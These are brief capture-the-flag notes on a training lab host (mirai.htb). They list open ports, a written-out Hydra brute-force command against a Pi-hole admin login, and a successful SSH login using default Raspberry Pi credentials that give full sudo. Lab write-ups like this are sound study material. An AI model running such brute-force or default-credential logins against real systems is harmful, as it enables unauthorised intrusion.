22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
1975/tcp  open  tcoflashagent
32400/tcp open  plex
32469/tcp open  unknown


pi.hole domain found


# Brute forcing pihole admin panel
```
hydra -l '' -P /usr/share/wordlists/rockyou.txt mirai.htb http-post-form "/admin/index.php?login:pw=^PASS^:Forgot password"
```
didn't working 
trying default creds for raspberry pi on ssh as user pi
ssh :pi:raspberry and it's valid
can run sudo with any command

# Plex on port 32400
Nothing
